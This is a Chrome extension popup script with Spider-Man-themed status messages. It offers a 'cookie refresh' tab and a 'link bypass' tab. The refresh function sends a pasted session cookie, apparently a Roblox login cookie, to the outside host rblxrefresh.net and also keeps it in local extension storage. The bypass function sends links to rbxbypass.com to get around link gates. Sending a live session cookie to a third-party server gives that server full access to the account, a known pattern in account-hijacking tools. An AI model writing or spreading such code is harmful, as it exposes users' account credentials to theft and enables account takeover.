const $ = (id) => document.getElementById(id);

const cookieEl = $("cookie");
const outEl = $("output");
const statusEl = $("status");
const btn = $("refresh-btn");
const copyBtn = $("copy-btn");

const bypassIn = $("bypass-in");
const bypassOut = $("bypass-out");
const bypassStatus = $("bypass-status");
const bypassBtn = $("bypass-btn");
const bypassCopy = $("bypass-copy");

// Tabs
document.querySelectorAll(".tab-btn").forEach((b) => {
  b.addEventListener("click", () => {
    document.querySelectorAll(".tab-btn").forEach((x) => x.classList.remove("active"));
    b.classList.add("active");
    const tab = b.dataset.tab;
    $("panel-session").hidden = tab !== "session";
    $("panel-bypass").hidden = tab !== "bypass";
  });
});

// Restore last input
chrome.storage.local.get(
  ["lastCookie", "lastOutput", "lastBypassIn", "lastBypassOut"],
  (v) => {
    if (v.lastCookie) cookieEl.value = v.lastCookie;
    if (v.lastOutput) outEl.value = v.lastOutput;
    if (v.lastBypassIn) bypassIn.value = v.lastBypassIn;
    if (v.lastBypassOut) bypassOut.value = v.lastBypassOut;
  }
);

function setStatus(el, msg, kind) {
  el.textContent = msg;
  el.className = "status " + (kind || "");
}

async function refreshCookie(raw) {
  const attempts = [
    { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
    { url: "https://rblxrefresh.net/refresh", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
    { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "cookie=" + encodeURIComponent(raw) } },
  ];
  let lastErr = null;
  for (const a of attempts) {
    try {
      const res = await fetch(a.url, a.init);
      const text = await res.text();
      if (!res.ok) { lastErr = `HTTP ${res.status}: ${text.slice(0,120)}`; continue; }
      let refreshed = null;
      try {
        const j = JSON.parse(text);
        refreshed = j.cookie || j.refreshed || j.result || j.data || j.newCookie || null;
        if (!refreshed && typeof j === "string") refreshed = j;
      } catch { refreshed = text.trim(); }
      if (refreshed) return String(refreshed);
      lastErr = "No cookie in response";
    } catch (e) { lastErr = e.message; }
  }
  throw new Error(lastErr || "Refresh failed");
}

async function bypassLink(raw) {
  const attempts = [
    { url: "https://www.rbxbypass.com/api/bypass", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: raw }) } },
    { url: "https://www.rbxbypass.com/api/bypass", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: raw }) } },
    { url: "https://www.rbxbypass.com/bypass", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ url: raw }) } },
    { url: "https://www.rbxbypass.com/api/bypass?url=" + encodeURIComponent(raw), init: { method: "GET" } },
    { url: "https://www.rbxbypass.com/api/bypass", init: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "url=" + encodeURIComponent(raw) } },
  ];
  let lastErr = null;
  for (const a of attempts) {
    try {
      const res = await fetch(a.url, a.init);
      const text = await res.text();
      if (!res.ok) { lastErr = `HTTP ${res.status}: ${text.slice(0,120)}`; continue; }
      let out = null;
      try {
        const j = JSON.parse(text);
        out = j.bypassed || j.url || j.result || j.link || j.data || j.destination || null;
        if (!out && typeof j === "string") out = j;
      } catch { out = text.trim(); }
      if (out) return String(out);
      lastErr = "No result in response";
    } catch (e) { lastErr = e.message; }
  }
  throw new Error(lastErr || "Bypass failed");
}

btn.addEventListener("click", async () => {
  const raw = cookieEl.value.trim();
  if (!raw) { setStatus(statusEl, "Enter a cookie first.", "err"); return; }
  btn.disabled = true;
  setStatus(statusEl, "Beaming request through the web...", "");
  try {
    const refreshed = await refreshCookie(raw);
    outEl.value = refreshed;
    chrome.storage.local.set({ lastCookie: raw, lastOutput: refreshed });
    setStatus(statusEl, "Refreshed! Web-slinger success.", "ok");
  } catch (e) {
    setStatus(statusEl, "Failed: " + e.message, "err");
  } finally { btn.disabled = false; }
});

copyBtn.addEventListener("click", async () => {
  if (!outEl.value) return;
  await navigator.clipboard.writeText(outEl.value);
  setStatus(statusEl, "Copied to clipboard.", "ok");
});

bypassBtn.addEventListener("click", async () => {
  const raw = bypassIn.value.trim();
  if (!raw) { setStatus(bypassStatus, "Enter a link first.", "err"); return; }
  bypassBtn.disabled = true;
  setStatus(bypassStatus, "Slinging through the bypass web...", "");
  try {
    const out = await bypassLink(raw);
    bypassOut.value = out;
    chrome.storage.local.set({ lastBypassIn: raw, lastBypassOut: out });
    setStatus(bypassStatus, "Bypassed! Spidey-sense confirmed.", "ok");
  } catch (e) {
    setStatus(bypassStatus, "Failed: " + e.message, "err");
  } finally { bypassBtn.disabled = false; }
});

bypassCopy.addEventListener("click", async () => {
  if (!bypassOut.value) return;
  await navigator.clipboard.writeText(bypassOut.value);
  setStatus(bypassStatus, "Copied to clipboard.", "ok");
});
